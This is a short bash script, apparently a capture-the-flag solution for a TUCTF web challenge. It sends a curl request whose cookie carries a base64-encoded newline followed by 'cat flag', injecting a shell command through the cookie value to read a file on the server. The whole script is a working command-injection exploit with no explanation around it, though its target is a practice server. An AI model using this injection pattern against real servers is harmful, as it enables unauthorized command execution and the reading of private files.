#!/bin/bash

curl 'http://cookieharrelson.tuctf.com/' -H "Cookie: tallahassee=`echo -e '\ncat flag'|base64`"
